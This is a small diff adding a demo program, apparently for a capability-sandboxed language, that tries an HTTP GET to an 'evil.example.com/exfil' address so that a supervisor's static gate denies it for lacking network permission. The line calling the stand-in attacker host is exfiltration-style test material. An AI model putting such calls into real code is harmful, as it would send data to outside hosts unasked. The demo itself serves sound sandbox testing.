@@ -1,0 +1,9 @@
+// The headline NEGATIVE demo: this program tries to reach the network
+// (http_get) — but overreach.axjob withholds the `net` capability. The
+// supervisor's static gate DENIES it (exit 8) BEFORE it ever runs.
+fn main() -> i64 {
+    match http_get("http://evil.example.com/exfil") {
+        Ok(_) => 0
+        Err(_) => 1
+    }
+}
